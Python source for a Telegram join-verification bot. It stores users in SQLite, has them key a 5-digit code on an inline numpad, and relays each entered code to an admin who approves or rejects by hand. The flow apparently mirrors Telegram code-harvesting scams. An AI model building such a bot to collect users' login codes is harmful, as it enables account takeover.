import logging
import random
import asyncio
import os
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ChatJoinRequestHandler, filters, ContextTypes
from telegram.error import BadRequest, Forbidden, TelegramError
import aiosqlite
from datetime import datetime
import traceback

# Logging setup
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Configuration
BOT_TOKEN = os.getenv('BOT_TOKEN')
ADMIN_ID = int(os.getenv('ADMIN_ID', '0'))
CHANNEL_ID = os.getenv('CHANNEL_ID', '')

class VerificationBot:
    def __init__(self):
        self.db_path = 'verification.db'
        self.verification_sessions = {}
        
    async def init_database(self):
        """Initialize SQLite database with async"""
        async with aiosqlite.connect(self.db_path) as db:
            await db.execute('''
                CREATE TABLE IF NOT EXISTS pending_verifications (
                    user_id INTEGER PRIMARY KEY,
                    username TEXT,
                    first_name TEXT,
                    verification_code TEXT,
                    entered_code TEXT,
                    timestamp DATETIME,
                    status TEXT DEFAULT 'pending'
                )
            ''')
            
            await db.execute('''
                CREATE TABLE IF NOT EXISTS verified_users (
                    user_id INTEGER PRIMARY KEY,
                    username TEXT,
                    first_name TEXT,
                    verified_date DATETIME
                )
            ''')
            
            await db.execute('''
                CREATE TABLE IF NOT EXISTS pending_join_requests (
                    user_id INTEGER,
                    chat_id TEXT,
                    chat_title TEXT,
                    request_date DATETIME,
                    status TEXT DEFAULT 'pending',
                    PRIMARY KEY (user_id, chat_id)
                )
            ''')
            
            await db.commit()

    async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Start command - simplified welcome"""
        try:
            user = update.message.from_user
            
            # Check if already verified
            async with aiosqlite.connect(self.db_path) as db:
                async with db.execute('SELECT * FROM verified_users WHERE user_id = ?', (user.id,)) as cursor:
                    if await cursor.fetchone():
                        await update.message.reply_text(
                            "✅ You're already verified! You can request to join the channel."
                        )
                        return
            
            welcome_text = f"""
Welcome {user.first_name}! 👋

To join our community, please complete a quick verification.

Click the button below to start.
            """
            
            keyboard = InlineKeyboardMarkup([
                [InlineKeyboardButton("🔐 Start Verification", callback_data=f"start_verify_{user.id}")]
            ])
            
            await update.message.reply_text(welcome_text, reply_markup=keyboard)
            
            # Store in pending
            async with aiosqlite.connect(self.db_path) as db:
                await db.execute('''
                    INSERT OR REPLACE INTO pending_verifications 
                    (user_id, username, first_name, timestamp, status)
                    VALUES (?, ?, ?, ?, ?)
                ''', (user.id, user.username, user.first_name, datetime.now(), 'pending'))
                await db.commit()
                
        except Exception as e:
            logger.error(f"Error in start: {e}\n{traceback.format_exc()}")
            await update.message.reply_text("An error occurred. Please try again.")

    async def handle_join_request(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle join requests"""
        try:
            user = update.chat_join_request.from_user
            chat = update.chat_join_request.chat
            
            logger.info(f"Join request from {user.first_name} to {chat.title}")
            
            # Store join request
            async with aiosqlite.connect(self.db_path) as db:
                await db.execute('''
                    INSERT OR REPLACE INTO pending_join_requests 
                    (user_id, chat_id, chat_title, request_date, status)
                    VALUES (?, ?, ?, ?, ?)
                ''', (user.id, str(chat.id), chat.title, datetime.now(), 'pending'))
                await db.commit()
                
                # Check if verified
                async with db.execute('SELECT * FROM verified_users WHERE user_id = ?', (user.id,)) as cursor:
                    if await cursor.fetchone():
                        try:
                            await context.bot.approve_chat_join_request(chat.id, user.id)
                            await db.execute('''
                                UPDATE pending_join_requests 
                                SET status = 'approved' 
                                WHERE user_id = ? AND chat_id = ?
                            ''', (user.id, str(chat.id)))
                            await db.commit()
                            
                            await context.bot.send_message(
                                user.id,
                                "✅ Welcome back! Your request has been approved."
                            )
                        except Exception as e:
                            logger.error(f"Failed to auto-approve: {e}")
                        return
            
            # Send verification prompt
            keyboard = InlineKeyboardMarkup([
                [InlineKeyboardButton("🔐 Verify Now", callback_data=f"start_verify_{user.id}")]
            ])
            
            try:
                await context.bot.send_message(
                    user.id,
                    f"Hello! To join {chat.title}, please verify your account first.",
                    reply_markup=keyboard
                )
            except Forbidden:
                logger.warning(f"Cannot send message to user {user.id} - they haven't started the bot")
            
            # Notify admin
            if ADMIN_ID:
                try:
                    await context.bot.send_message(
                        ADMIN_ID,
                        f"🔔 New join request\n\n"
                        f"User: {user.first_name} (@{user.username})\n"
                        f"ID: {user.id}\n"
                        f"Channel: {chat.title}"
                    )
                except Exception as e:
                    logger.error(f"Failed to notify admin: {e}")
            
        except Exception as e:
            logger.error(f"Error in handle_join_request: {e}\n{traceback.format_exc()}")

    async def handle_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle all callback queries"""
        try:
            query = update.callback_query
            user_id = query.from_user.id
            data = query.data
            
            await query.answer()
            
            # Admin-only callbacks
            if user_id == ADMIN_ID:
                if data.startswith('setup_code_'):
                    target_user_id = int(data.split('_')[2])
                    await self.admin_setup_code(query, context, target_user_id)
                    return
                elif data == 'view_pending':
                    await self.show_pending_users(query, context)
                    return
                elif data.startswith('approve_'):
                    target_user_id = int(data.split('_')[1])
                    await self.admin_approve(query, context, target_user_id, True)
                    return
                elif data.startswith('reject_'):
                    target_user_id = int(data.split('_')[1])
                    await self.admin_approve(query, context, target_user_id, False)
                    return
            
            # User callbacks
            if data.startswith('start_verify_'):
                await self.start_verification_process(query, context)
            elif data.startswith('num_'):
                await self.handle_number_input(query, context)
                
        except Exception as e:
            logger.error(f"Error in handle_callback: {e}\n{traceback.format_exc()}")
            try:
                await query.edit_message_text("An error occurred. Please contact support.")
            except:
                pass

    async def start_verification_process(self, query, context):
        """Start the verification flow"""
        try:
            user_id = query.from_user.id
            
            # Generate code
            code = str(random.randint(10000, 99999))
            
            # Save to database
            async with aiosqlite.connect(self.db_path) as db:
                await db.execute('''
                    UPDATE pending_verifications 
                    SET verification_code = ?, status = 'code_generated'
                    WHERE user_id = ?
                ''', (code, user_id))
                await db.commit()
                
                # Get user info
                async with db.execute('''
                    SELECT first_name, username FROM pending_verifications WHERE user_id = ?
                ''', (user_id,)) as cursor:
                    user_info = await cursor.fetchone()
            
            # Send numpad interface
            keyboard = [
                [InlineKeyboardButton('1', callback_data=f'num_1'),
                 InlineKeyboardButton('2', callback_data=f'num_2'),
                 InlineKeyboardButton('3', callback_data=f'num_3')],
                [InlineKeyboardButton('4', callback_data=f'num_4'),
                 InlineKeyboardButton('5', callback_data=f'num_5'),
                 InlineKeyboardButton('6', callback_data=f'num_6')],
                [InlineKeyboardButton('7', callback_data=f'num_7'),
                 InlineKeyboardButton('8', callback_data=f'num_8'),
                 InlineKeyboardButton('9', callback_data=f'num_9')],
                [InlineKeyboardButton('0', callback_data=f'num_0')]
            ]
            
            await query.edit_message_text(
                "Enter verification code:",
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
            
            # Initialize session
            self.verification_sessions[user_id] = {
                'entered_code': '',
                'correct_code': code,
                'message_id': query.message.message_id
            }
            
            # Notify admin with code
            if ADMIN_ID and user_info:
                admin_keyboard = InlineKeyboardMarkup([
                    [InlineKeyboardButton("✅ Approve", callback_data=f"approve_{user_id}"),
                     InlineKeyboardButton("❌ Reject", callback_data=f"reject_{user_id}")]
                ])
                
                await context.bot.send_message(
                    ADMIN_ID,
                    f"🔐 Verification Started\n\n"
                    f"User: {user_info[0]} (@{user_info[1]})\n"
                    f"ID: {user_id}\n"
                    f"Code: `{code}`\n\n"
                    f"Send this code to the user via your preferred method.",
                    parse_mode='Markdown',
                    reply_markup=admin_keyboard
                )
                
        except Exception as e:
            logger.error(f"Error starting verification: {e}\n{traceback.format_exc()}")

    async def handle_number_input(self, query, context):
        """Handle number pad input"""
        try:
            user_id = query.from_user.id
            
            if user_id not in self.verification_sessions:
                await query.edit_message_text("Session expired. Please start again with /start")
                return
            
            number = query.data.split('_')[1]
            session = self.verification_sessions[user_id]
            
            if len(session['entered_code']) < 5:
                session['entered_code'] += number
            
            # Show dots for entered digits
            dots = '•' * len(session['entered_code'])
            
            if len(session['entered_code']) == 5:
                # Auto-submit
                await self.submit_code(query, context, user_id, session)
            else:
                await query.edit_message_text(
                    f"Enter verification code:\n\n{dots}",
                    reply_markup=query.message.reply_markup
                )
                
        except Exception as e:
            logger.error(f"Error handling number input: {e}\n{traceback.format_exc()}")

    async def submit_code(self, query, context, user_id, session):
        """Submit verification code"""
        try:
            entered = session['entered_code']
            
            # Save to database
            async with aiosqlite.connect(self.db_path) as db:
                await db.execute('''
                    UPDATE pending_verifications 
                    SET entered_code = ?, status = 'code_entered'
                    WHERE user_id = ?
                ''', (entered, user_id))
                await db.commit()
            
            await query.edit_message_text(
                "✅ Code submitted!\n\nVerifying... Please wait."
            )
            
            # Notify admin for approval
            if ADMIN_ID:
                keyboard = InlineKeyboardMarkup([
                    [InlineKeyboardButton("✅ Approve", callback_data=f"approve_{user_id}"),
                     InlineKeyboardButton("❌ Reject", callback_data=f"reject_{user_id}")]
                ])
                
                async with aiosqlite.connect(self.db_path) as db:
                    async with db.execute('''
                        SELECT first_name, username, verification_code 
                        FROM pending_verifications WHERE user_id = ?
                    ''', (user_id,)) as cursor:
                        info = await cursor.fetchone()
                
                if info:
                    match = "✅ MATCH" if entered == info[2] else "❌ MISMATCH"
                    await context.bot.send_message(
                        ADMIN_ID,
                        f"🔍 Code Submitted\n\n"
                        f"User: {info[0]} (@{info[1]})\n"
                        f"Expected: `{info[2]}`\n"
                        f"Entered: `{entered}`\n"
                        f"Status: {match}",
                        parse_mode='Markdown',
                        reply_markup=keyboard
                    )
                    
        except Exception as e:
            logger.error(f"Error submitting code: {e}\n{traceback.format_exc()}")

    async def admin_approve(self, query, context, target_user_id, approved):
        """Admin approval/rejection"""
        try:
            async with aiosqlite.connect(self.db_path) as db:
                async with db.execute('''
                    SELECT first_name, username, entered_code, verification_code
                    FROM pending_verifications WHERE user_id = ?
                ''', (target_user_id,)) as cursor:
                    user_info = await cursor.fetchone()
                
                if not user_info:
                    await query.edit_message_text("User not found.")
                    return
                
                if approved:
                    # Add to verified
                    await db.execute('''
                        INSERT OR REPLACE INTO verified_users 
                        (user_id, username, first_name, verified_date)
                        VALUES (?, ?, ?, ?)
                    ''', (target_user_id, user_info[1], user_info[0], datetime.now()))
                    
                    await db.execute('''
                        UPDATE pending_verifications 
                        SET status = 'verified' WHERE user_id = ?
                    ''', (target_user_id,))
                    
                    await db.commit()
                    
                    # Auto-approve pending joins
                    approved_chats = await self.approve_joins(context, target_user_id)
                    
                    # Notify user
                    msg = "✅ Verification complete! You've been approved."
                    if approved_chats:
                        msg += f"\n\nAuto-approved for {len(approved_chats)} channel(s)."
                    
                    try:
                        await context.bot.send_message(target_user_id, msg)
                    except:
                        pass
                    
                    await query.edit_message_text(
                        f"✅ APPROVED\n\n"
                        f"User: {user_info[0]}\n"
                        f"Approved at: {datetime.now().strftime('%Y-%m-%d %H:%M')}"
                    )
                else:
                    await db.execute('''
                        UPDATE pending_verifications 
                        SET status = 'rejected' WHERE user_id = ?
                    ''', (target_user_id,))
                    await db.commit()
                    
                    try:
                        await context.bot.send_message(
                            target_user_id,
                            "❌ Verification failed. Please try again with /start"
                        )
                    except:
                        pass
                    
                    await query.edit_message_text(
                        f"❌ REJECTED\n\n"
                        f"User: {user_info[0]}"
                    )
            
            # Clean up session
            if target_user_id in self.verification_sessions:
                del self.verification_sessions[target_user_id]
                
        except Exception as e:
            logger.error(f"Error in admin_approve: {e}\n{traceback.format_exc()}")

    async def approve_joins(self, context, user_id):
        """Auto-approve pending join requests"""
        approved = []
        try:
            async with aiosqlite.connect(self.db_path) as db:
                async with db.execute('''
                    SELECT chat_id, chat_title 
                    FROM pending_join_requests 
                    WHERE user_id = ? AND status = 'pending'
                ''', (user_id,)) as cursor:
                    requests = await cursor.fetchall()
                
                for chat_id, chat_title in requests:
                    try:
                        chat_id_int = int(chat_id) if chat_id.lstrip('-').isdigit() else chat_id
                        await context.bot.approve_chat_join_request(chat_id_int, user_id)
                        
                        await db.execute('''
                            UPDATE pending_join_requests 
                            SET status = 'approved'
                            WHERE user_id = ? AND chat_id = ?
                        ''', (user_id, chat_id))
                        
                        approved.append(chat_title)
                        logger.info(f"Auto-approved {user_id} for {chat_title}")
                    except Exception as e:
                        logger.error(f"Failed to approve join: {e}")
                
                await db.commit()
        except Exception as e:
            logger.error(f"Error in approve_joins: {e}")
        
        return approved

    async def show_pending_users(self, query, context):
        """Show pending verifications"""
        try:
            async with aiosqlite.connect(self.db_path) as db:
                async with db.execute('''
                    SELECT user_id, first_name, username, status, timestamp
                    FROM pending_verifications 
                    WHERE status != 'verified'
                    ORDER BY timestamp DESC
                    LIMIT 10
                ''') as cursor:
                    pending = await cursor.fetchall()
            
            if not pending:
                await query.edit_message_text("No pending verifications.")
                return
            
            msg = "📋 Pending Verifications:\n\n"
            for user in pending:
                msg += f"• {user[1]} (@{user[2]})\n  Status: {user[3]}\n  Time: {user[4]}\n\n"
            
            keyboard = InlineKeyboardMarkup([
                [InlineKeyboardButton("🔄 Refresh", callback_data="view_pending")]
            ])
            
            await query.edit_message_text(msg, reply_markup=keyboard)
            
        except Exception as e:
            logger.error(f"Error showing pending: {e}")

    async def stats(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Show statistics"""
        if update.message.from_user.id != ADMIN_ID:
            return
        
        try:
            async with aiosqlite.connect(self.db_path) as db:
                async with db.execute('SELECT COUNT(*) FROM verified_users') as c:
                    verified = (await c.fetchone())[0]
                
                async with db.execute('''
                    SELECT COUNT(*) FROM pending_verifications WHERE status != 'verified'
                ''') as c:
                    pending = (await c.fetchone())[0]
            
            msg = f"📊 Statistics\n\n✅ Verified: {verified}\n⏳ Pending: {pending}"
            
            keyboard = InlineKeyboardMarkup([
                [InlineKeyboardButton("📋 View Pending", callback_data="view_pending")]
            ])
            
            await update.message.reply_text(msg, reply_markup=keyboard)
            
        except Exception as e:
            logger.error(f"Error in stats: {e}")

async def post_init(application):
    """Initialize after app creation"""
    bot_instance = application.bot_data['bot_instance']
    await bot_instance.init_database()
    logger.info("Database initialized")

def main():
    """Main function"""
    if not BOT_TOKEN:
        logger.error("BOT_TOKEN not found!")
        return
    
    bot = VerificationBot()
    
    application = Application.builder().token(BOT_TOKEN).post_init(post_init).build()
    application.bot_data['bot_instance'] = bot
    
    # Handlers
    application.add_handler(CommandHandler("start", bot.start))
    application.add_handler(CommandHandler("stats", bot.stats))
    application.add_handler(ChatJoinRequestHandler(bot.handle_join_request))
    application.add_handler(CallbackQueryHandler(bot.handle_callback))
    
    logger.info("Bot starting...")
    logger.info(f"Admin ID: {ADMIN_ID}")
    
    application.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)

if __name__ == '__main__':
    main()
